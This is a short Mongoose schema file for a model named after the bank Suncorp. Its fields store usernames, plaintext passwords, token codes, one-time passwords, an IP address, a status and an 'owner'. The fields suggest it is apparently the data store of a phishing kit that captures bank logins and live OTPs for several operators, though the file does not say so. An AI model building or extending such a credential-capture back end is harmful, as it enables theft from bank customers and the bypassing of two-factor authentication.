const mongoose = require("mongoose");

const suncorpSchema = new mongoose.Schema({
  uniqueid: Number,
  username: String,
  password: String,
  tokenCode: String,
  otp: String,
  status: Number,
  ip: String,
  owner: String,
});

module.exports = mongoose.model("Suncorp", suncorpSchema);
